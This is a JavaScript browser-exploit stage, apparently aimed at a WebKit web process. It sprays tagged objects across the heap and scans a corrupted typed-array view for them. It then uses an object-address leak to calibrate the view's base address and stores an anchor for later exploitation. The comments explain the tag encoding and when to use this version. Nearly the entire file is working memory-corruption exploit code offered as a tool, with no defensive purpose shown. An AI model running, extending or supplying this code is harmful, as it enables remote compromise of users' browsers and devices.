// Groom push v9: push the JS object heap across a >2.6 MiB gap.
//
// v2 caps at 8 batches for a real reason: the marker is a 16-bit tag
// (0x6b000000 | (batch*8192 + n)), so batch 8 overflows into byte 2 and the
// v2 scan (which requires byte2 == 0) stops seeing it. This variant keeps a
// 24-bit tag and decodes the full 24 bits, so up to 32 batches can be
// distinguished:
//
//   bytes  b0 b1 b2 b3 = [low8] [mid8] [high8] 0x6b
//   tag24 = b0 | b1<<8 | b2<<16
//   batch = tag24 >>> 13, index = tag24 & 0x1fff   (batch < 32)
//
// The object marker stays a small Int32 (0x6b000000 .. 0x6b03ffff), which is
// what makes it store inline as the 4 bytes above. Everything else (safe
// 4 MiB scan, rooted batches in state.groomBatches, anchor validation by
// writing 0x55667788 through the object and reading it back through the
// forged view) is the same as v2.
//
// Use when push_v2 reports `pattern: 0` on a fresh WebProcess: the heap is
// simply further than 8 batches of 8192 objects can reach.
var state = window.__fw14ArrayState;
var result;
try {
  if (!state || !state.view || !state.array || !state.a ||
      state.array[0] !== state.a || !Number.isInteger(state.index))
    throw new Error("groom_preflight_failed");
  var batches = state.groomBatches || (state.groomBatches = []);
  var view = state.view;
  var viewLength = view.length;
  var scanEnd = Math.min(4194304, viewLength - 4);
  var LIMIT = 16;
  var rounds = 0, pattern = 0, cand = 0, found = null;
  var firstPatternRound = 0;

  function scan() {
    for (var i = 0; i < scanEnd; i += 8) {
      var b0 = view[i], b1 = view[i + 1], b2 = view[i + 2], b3 = view[i + 3];
      if (b3 !== 0x6b) continue;
      var tag24 = b0 + b1 * 256 + b2 * 65536;
      var b = tag24 >>> 13, index = tag24 & 0x1fff;
      if (b >= LIMIT) continue;
      pattern++;
      if (!firstPatternRound) firstPatternRound = rounds;
      var other = batches[b];
      if (!other || index >= other.length) continue;
      var object = other[index];
      if (object.marker !== (0x6b000000 + tag24)) continue;
      cand++;
      var ok = false;
      try {
        object.marker = 0x55667788;
        ok = view[i] === 0x88 && view[i + 1] === 0x77 &&
             view[i + 2] === 0x66 && view[i + 3] === 0x55;
      } finally {
        object.marker = 0x6b000000 + tag24;
      }
      if (!ok) continue;
      var word = "0x";
      try {
        state.array[0] = object;
        for (var w = 7; w >= 0; w--)
          word += view[state.index + w].toString(16).padStart(2, "0");
      } finally {
        state.array[0] = state.a;
      }
      var base = Number(word) + 8 - i;
      if (Number.isSafeInteger(base) && base > 0 && base % 4096 === 0)
        return { index: i, word: word, base: base, batch: b, object: object };
    }
    return null;
  }

  while (!found && batches.length < LIMIT) {
    var batchNumber = batches.length;
    var tag = 0x6b000000 + batchNumber * 8192;
    var batch = new Array(8192);
    for (var n = 0; n < 8192; n++) batch[n] = { marker: tag + n };
    batches.push(batch);
    rounds++;
    if (api && typeof api.markSync === "function" && (rounds % 8) === 0)
      api.markSync("gp9_round_" + rounds);
    found = scan();
  }
  if (found) {
    found.object.marker = 0x11223344;
    state.addressAnchor = found.object;
    state.calibratedViewBase = found.base;
    result = {
      id: "inrange_anchor_groom_push_v9", status: "pass",
      details: {
        rounds: rounds, batches: batches.length, pattern: pattern,
        cand: cand, found_index: found.index,
        found_base: "0x" + found.base.toString(16),
        found_word: found.word, found_batch: found.batch,
        first_pattern_round: firstPatternRound,
        scan_end: scanEnd, state: "anchored"
      }
    };
  } else {
    result = {
      id: "inrange_anchor_groom_push_v9", status: "fail",
      details: {
        rounds: rounds, batches: batches.length, pattern: pattern,
        cand: cand, found_index: -1, found_base: "", found_word: "",
        found_batch: -1, first_pattern_round: firstPatternRound,
        scan_end: scanEnd, state: pattern > 0 ? "encoding" : "absent"
      }
    };
  }
} catch (e) {
  result = { id: "inrange_anchor_groom_push_v9", status: "error",
             details: { error: String(e).slice(0, 220) } };
}
return [result];
